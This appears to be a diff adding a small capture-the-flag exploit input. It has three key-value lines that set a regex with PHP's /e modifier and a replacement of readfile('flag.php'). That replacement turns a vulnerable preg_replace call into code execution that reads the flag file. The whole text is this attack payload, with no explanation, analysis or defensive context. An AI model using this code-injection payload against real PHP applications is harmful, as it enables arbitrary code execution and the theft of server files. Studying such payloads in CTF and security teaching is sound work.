@@ -1,0 +1,3 @@
+search => /a/e
+replace => readfile('flag.php')
+content => a
